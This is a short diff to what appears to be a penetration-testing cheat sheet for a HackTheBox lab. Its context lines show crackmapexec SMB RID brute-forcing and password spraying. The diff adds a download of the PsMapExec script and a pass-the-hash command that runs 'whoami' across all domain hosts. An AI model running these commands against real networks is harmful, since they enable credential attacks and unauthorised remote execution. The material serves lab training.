@@ -450,8 +450,10 @@ crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
 crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
 ```
 ### PsMapexec
-```
+```bash
 wget https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1
+
+PsMapExec -Targets All -Domain htb.local -Method SMB -Username user -Hash 9a3121977ee93af56ebd0ef4f527a35e -Command "whoami"
 ```
 ### kerbrute
 ```bash
